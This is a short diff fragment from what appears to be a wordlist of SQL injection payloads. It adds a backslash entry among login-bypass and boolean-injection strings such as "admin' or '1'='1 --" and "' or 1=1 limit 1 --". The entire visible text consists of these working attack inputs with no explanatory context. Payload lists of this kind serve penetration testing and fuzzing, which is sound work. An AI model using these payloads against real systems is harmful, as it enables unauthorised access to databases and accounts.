@@ -4,6 +4,7 @@ and 1=1
 and 1=1--
 AND 1=1
 AND 1=1-- 
+\
 admin' or '1'='1 --
 Usuario (' or 1=1 limit 1 -- 
 ' or 1=1 limit 1 -- (
